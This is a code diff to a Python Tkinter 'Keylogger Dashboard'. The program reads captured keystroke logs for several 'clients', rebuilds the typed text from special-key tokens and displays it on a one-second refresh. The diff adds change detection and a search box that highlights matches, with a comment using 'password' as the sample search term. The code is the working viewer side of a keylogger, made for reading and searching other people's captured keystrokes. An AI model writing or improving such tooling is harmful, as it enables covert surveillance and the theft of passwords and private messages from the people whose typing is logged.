@@ -2,10 +2,14 @@ import tkinter as tk
 from pathlib import Path
 import re
 
+
 LOG_DIR = Path("logs")
 TOKEN_PATTERN = re.compile(r"\[(BS|TAB|DEL|SHIFT|CAPS)\]")
 REFRESH_SECONDS = 1
 TAB_SIZE = 4
+
+# To remember the text so we wont refresh if nothing changed
+previous_text = ""
 
 def apply_backspace(lines):
     if not lines:
@@ -62,7 +66,6 @@ def parse_log(raw_text):
 
     return "\n".join(lines) # Finished with this line and we glue it to the next like with \n
 
-
 def read_all_logs():
     clients = []
 
@@ -83,8 +86,8 @@ def read_all_logs():
 
     return clients
 
-
 def update_dashboard():
+    global previous_text
     clients = read_all_logs()
     
     # Build the string of text to show on screen
@@ -97,44 +100,52 @@ def update_dashboard():
         display_text += "-" * 70 + "\n"
         display_text += client["parsed_text"][-800:] + "\n\n"
         
-    # Unlock the text box, clean it, insert new text, lock it again
-    text_box.config(state=tk.NORMAL)
-    text_box.delete("1.0", tk.END)
-    text_box.insert(tk.END, display_text)
-
-    # sort of CTRL F
-    to_search = search_entry.get() # get the text we wanna search
+    # Only update text box if logs changed
+    # Keeps scrollbar from jumping while trying to read
+    if display_text != previous_text:
+        text_box.config(state=tk.NORMAL)
+        text_box.delete("1.0", tk.END)
+        text_box.insert(tk.END, display_text)
+        text_box.config(state=tk.DISABLED) # Read only
+        previous_text = display_text # Update memory
+        
+    # Sort of CTRL F
+    text_box.tag_remove("highlight", "1.0", tk.END) # Clear old highlights
+    
+    # Search new word
+    to_search = search_entry.get() 
     if to_search:
         # Search from end to find the most recent
         pos = text_box.search(to_search, tk.END, stopindex="1.0", backwards=True, nocase=True) # tk.END - start at bottom text box, nocase = ignore caps
         if pos:
             # Calc end position of matched word
-            end_pos = f"{pos}+{len(to_search)}c" # pos+ = line.column add to start pos: pos = 3.5 "password": "3.5+8c"
+            end_pos = f"{pos}+{len(to_search)}c" 
             # Highlight tag the word
             text_box.tag_add("highlight", pos, end_pos) 
             # Auto scroll to the word
             text_box.see(pos)
 
-    text_box.config(state=tk.DISABLED) # Read only
-    
     # Tkinter - run function again in 1000 milliseconds (1 sec)
     root.after(REFRESH_SECONDS * 1000, update_dashboard)
 
 
+
 def main():
-    global root, text_box, search_entry # global so that update_dashboard() can access them
+    global root, text_box, search_entry  # global so that update_dashboard() can access them
     
     # UI
     root = tk.Tk()
     root.title("Keylogger Dashboard")
-    root.geometry("800x600")
+    root.geometry("800x650")
     root.configure(bg="#1b2a6f")
 
-    # Bind Ctrl+F to focus the search bar
+
+    # Bind Ctrl+F - focus the search bar
     root.bind('<Control-f>', lambda e: search_entry.focus_set())
     root.bind('<Control-F>', lambda e: search_entry.focus_set())
 
-    # Top Title
+
+    # Top title
     title_label = tk.Label(
         root, 
         text="--------- KEYLOGGER DASHBOARD ---------", 
@@ -142,9 +153,9 @@ def main():
         fg="#4ade80",
         font=("Courier", 16, "bold")
     )
-    title_label.pack(pady=15)
+    title_label.pack(pady=10)
 
-    # Search Bar Frame
+    # Search bar
     search_frame = tk.Frame(root, bg="#1b2a6f")
     search_frame.pack(fill=tk.X, padx=20, pady=(0, 10))
 
@@ -166,7 +177,7 @@ def main():
     )
     search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
 
-    # Main Text Area
+    # Main text
     text_box = tk.Text(
         root, 
         bg="#0d1740", # background
@@ -179,13 +190,15 @@ def main():
         pady=10
     )
     # Pack it so it expands to fill the window
-    text_box.pack(expand=True, fill=tk.BOTH, padx=20, pady=20)
+    text_box.pack(expand=True, fill=tk.BOTH, padx=20, pady=(0, 20))
+
+    # Configure highlight color
+    text_box.tag_configure("highlight", background="#4ade80", foreground="#0d1740")
 
     update_dashboard()
 
     # Start the graphics window
     root.mainloop()
-
 
 if __name__ == "__main__":
     main()
